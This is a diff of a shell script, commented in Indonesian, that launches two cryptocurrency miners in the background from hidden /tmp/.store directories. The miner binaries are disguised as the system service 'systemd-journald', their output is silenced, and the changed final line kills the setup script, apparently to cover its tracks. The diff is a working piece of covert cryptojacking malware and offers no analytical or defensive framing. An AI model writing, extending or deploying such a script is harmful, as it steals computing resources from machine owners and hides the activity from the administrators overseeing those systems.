@@ -39,12 +39,14 @@ rm -f systemd-journald.
 echo -e "${GREEN}[*] Starting miners...${NC}"
 
 # Start miner pertama (pakai CPU core 0)
-/bin/bash -c "cd /tmp/.store/1 && nohup ./systemd-journald > /dev/null 2>&1 &"
+cd /tmp/.store/1 && nohup ./systemd-journald > /dev/null 2>&1 &
+
+cd
 
 # Start miner kedua (pakai CPU core 1)
-/bin/bash -c "cd /tmp/.store/2 && nohup ./systemd-journald > /dev/null 2>&1 &"
+cd /tmp/.store/2 && nohup ./systemd-journald > /dev/null 2>&1 &
 
 echo -e "${GREEN}[✓] Setup selesai dan miners jalan di background.${NC}"
 
 # Cek miner jalan
-ps aux | grep systemd-journald. | grep -v grep
+pkill -f setup.sh
